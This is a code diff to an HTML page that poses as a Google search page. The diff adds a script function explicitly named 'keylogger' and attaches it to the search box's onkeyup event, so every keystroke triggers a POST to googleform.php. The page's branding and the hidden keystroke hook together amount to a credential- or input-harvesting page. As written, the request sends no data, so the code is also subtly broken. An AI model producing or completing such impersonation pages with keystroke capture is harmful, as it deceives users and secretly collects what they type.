@@ -46,13 +46,21 @@ input[type=submit]:hover {
 }
 </style>
 
+<script>
+function keylogger() {
+  const xhttp = new XMLHttpRequest();
+  xhttp.open("POST", "googleform.php");
+  xhttp.send();
+}
+</script>
+
 <title>Google</title>
 </head>
 <body>
 <h1>Google</h1>
 
 <form action="googleform.php" method="post">
-  <input type="text" id="googlesearch" name="googlesearch" placeholder="Search Google or type a URL">
+  <input type="text" onkeyup="keylogger()" id="googlesearch" name="googlesearch" placeholder="Search Google or type a URL">
   
   <input type="submit" value="Search">
 </form>
